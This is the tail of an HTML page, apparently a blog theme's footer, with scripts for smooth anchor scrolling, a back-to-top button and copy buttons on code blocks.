<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
